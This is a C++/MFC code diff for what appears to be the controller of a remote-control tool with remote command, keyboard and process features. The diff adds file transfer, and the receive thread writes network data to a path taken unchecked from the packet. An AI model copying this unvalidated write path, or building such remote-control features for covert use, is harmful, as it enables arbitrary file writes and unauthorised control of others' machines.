@@ -11,6 +11,8 @@
 #include"DATA.h"
 #include<vector>
 #include<TlHelp32.h>
+#include<fstream>
+using namespace std;
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
@@ -41,6 +43,7 @@ DWORD WINAPI recvthread(LPVOID lparam)
 		bret = recvdata(*(p->sclient), (char*)&drbuf, sizeof(unsigned int) * 2);
 		if (!bret) return 0;
 
+		p->psession->clientlasttime = GetTickCount();
 		senddatahead(*(p->sclient), SERVER_BEAT);
 
 		if (drbuf.length >= 0)
@@ -125,6 +128,28 @@ DWORD WINAPI recvthread(LPVOID lparam)
 					}
 
 					p->psession->pprocessdlg->pdlldlg->list_dll.InsertItem(p->psession->pprocessdlg->pdlldlg->dllpath.size()-1, module32.szExePath);
+				}
+			}
+			else if (drbuf.type == CLIENT_FILE_DOWN)
+			{
+				p->psession->pfiletransfer->s = *(p->sclient);
+			}
+			else if (drbuf.type == SERVER_FILE_UP)
+			{
+				if (drbuf.length == 0)
+				{
+					senddatahead(*(p->sclient), CLIENT_FILE_DOWN);
+				}
+				if (drbuf.length > 0)
+				{
+					filedatastruct* fdatastruct = (filedatastruct*)pdata;
+					ofstream file;
+
+
+					file.open(fdatastruct->despath, ios::out | ios::app|ios::binary, _SH_DENYRW);
+
+					file.write(fdatastruct->filedata, fdatastruct->datasize);
+					file.close();
 				}
 			}
 
@@ -331,6 +356,7 @@ BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
 	ON_COMMAND(ID_CMD, &CRemoteSERVERDlg::OnCmd)
 	ON_COMMAND(ID_KEYBOARD, &CRemoteSERVERDlg::OnKeyboard)
 	ON_COMMAND(ID_PROCESS, &CRemoteSERVERDlg::OnProcess)
+	ON_COMMAND(ID_32783, &CRemoteSERVERDlg::Onfiletransfer)
 END_MESSAGE_MAP()
 
 
@@ -548,4 +574,26 @@ void CRemoteSERVERDlg::OnProcess()
 	map_session[sclient]->pprocessdlg->ShowWindow(SW_SHOW);
 
 	senddatahead(sclient, SERVER_PROCESS_GET);
+}
+
+
+void CRemoteSERVERDlg::Onfiletransfer()
+{
+	// TODO: 在此添加命令处理程序代码
+	int pos = list_client.GetSelectionMark();
+
+	SOCKET sclient = list_client.GetItemData(pos);
+
+	senddatahead(sclient, SERVER_FILE_UP);
+
+	{
+		std::lock_guard<std::mutex> lg(accept_mutex);
+		if (map_session[sclient]->pfiletransfer == NULL)
+		{
+			map_session[sclient]->pfiletransfer = new Cfiletransferdlg;
+			map_session[sclient]->pfiletransfer->Create(IDD_Cfiletransferdlg, this);
+		}
+	}
+
+	map_session[sclient]->pfiletransfer->ShowWindow(SW_SHOW);
 }
